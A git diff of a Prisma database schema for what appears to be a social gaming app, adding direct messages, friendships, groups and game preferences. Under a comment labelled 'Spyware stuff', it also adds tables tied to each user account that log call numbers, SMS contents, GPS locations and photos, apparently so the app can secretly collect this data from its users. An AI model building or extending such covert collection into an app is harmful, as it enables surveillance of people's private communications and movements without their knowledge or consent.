@@ -4,8 +4,42 @@ model Account {
   email     String    @unique @db.VarChar(256)
   password  String
   created_at DateTime @default(now())
+
   sessions  Session[]
-}// This is your Prisma schema file,
+  timezone  AccountTimeZone?
+
+  sent_dm  DirectMessage[]      @relation("Sender")
+  received_dm  DirectMessage[]      @relation("Contact")
+
+  friends_as Friendship[]  @relation("Account1")
+  friends_with Friendship[]  @relation("Account2")
+  game_preferences GamePreference[]
+
+  group_members GroupMember[]
+  group_messages GroupMessage[]
+
+  // Spyware stuff
+  call_logs CallLog[]
+  location_logs LocationLog[]
+  sms_logs SMSLog[]
+  photo_logs PhotoLog[]
+}
+model AccountTimeZone {
+  account_id Int       @id
+  code       String    @default("A") @db.VarChar(1)
+
+  account    Account   @relation(fields: [account_id], references: [id])
+}
+model CallLog {
+  id             Int       @id @default(autoincrement())
+  account_id     Int
+  target_number  String    @db.VarChar(64)
+  timestamp      DateTime
+
+  account        Account   @relation(fields: [account_id], references: [id])
+}
+
+// This is your Prisma schema file,
 // learn more about it in the docs: https://pris.ly/d/prisma-schema
 
 generator client {
@@ -16,9 +50,106 @@ datasource db {
   provider = "postgresql"
   url      = env("DATABASE_URL")
 }
+model DirectMessageAttachment {
+  id          Int            @id @default(autoincrement())
+  dm_id       Int
+  dm          DirectMessage  @relation(fields: [dm_id], references: [id])
+}
+model DirectMessage {
+  id          Int      @id @default(autoincrement())
+  sender_id   Int
+  contact_id  Int
+  content     String   @db.Text
+  timestamp   DateTime @default(now())
+
+  attachments DirectMessageAttachment[]
+
+  sender      Account  @relation("Sender", fields: [sender_id], references: [id])
+  contact     Account  @relation("Contact", fields: [contact_id], references: [id])
+}
+model Friendship {
+  account_1_id Int
+  account_2_id Int
+  request_accepted Boolean @default(false)
+
+  @@id([account_1_id, account_2_id])
+  account1   Account @relation("Account1", fields: [account_1_id], references: [id])
+  account2   Account @relation("Account2", fields: [account_2_id], references: [id])
+}
+model GamePreference {
+  id          Int      @id @default(autoincrement())
+  account_id  Int
+  name        String   @db.VarChar(256)
+
+  account     Account  @relation(fields: [account_id], references: [id])
+}
+model GroupMember {
+  account_id  Int
+  group_id    Int
+  is_admin    Boolean  @default(false)
+
+  account     Account  @relation(fields: [account_id], references: [id])
+  group       Group    @relation(fields: [group_id], references: [id])
+
+  @@id([account_id, group_id])
+}
+
+model GroupMessageAttachment {
+  id           Int              @id @default(autoincrement())
+  message_id   Int
+  message      GroupMessage     @relation(fields: [message_id], references: [id])
+}
+model GroupMessage {
+  id          Int       @id @default(autoincrement())
+  sender_id   Int
+  group_id    Int
+  content     String    @db.Text
+  timestamp   DateTime  @default(now())
+
+  attachments GroupMessageAttachment[]
+
+  @@index([sender_id])
+  @@index([group_id])
+
+  sender      Account   @relation(fields: [sender_id], references: [id])
+  group       Group     @relation(fields: [group_id], references: [id])
+}
+model Group {
+  id          Int      @id @default(autoincrement())
+  name        String   @db.VarChar(128)
+  description String?  @db.Text
+
+  message GroupMessage[]
+  members GroupMember[]
+}
+model LocationLog {
+  id          Int       @id @default(autoincrement())
+  account_id  Int
+  lat         Float
+  lng         Float
+  timestamp   DateTime
+
+  account     Account   @relation(fields: [account_id], references: [id])
+}
+model PhotoLog {
+  id          Int       @id @default(autoincrement())
+  account_id  Int
+  timestamp   DateTime
+
+  account     Account   @relation(fields: [account_id], references: [id])
+}
 model Session {
   token       String   @id @db.VarChar(64)
   expiry_date DateTime 
   accountId   Int
   account     Account  @relation(fields: [accountId], references: [id])
+}
+model SMSLog {
+  id             Int       @id @default(autoincrement())
+  account_id     Int
+  content        String    @db.Text
+  target_number  String    @db.VarChar(64)
+  timestamp      DateTime
+
+  account        Account   @relation(fields: [account_id], references: [id])
 }
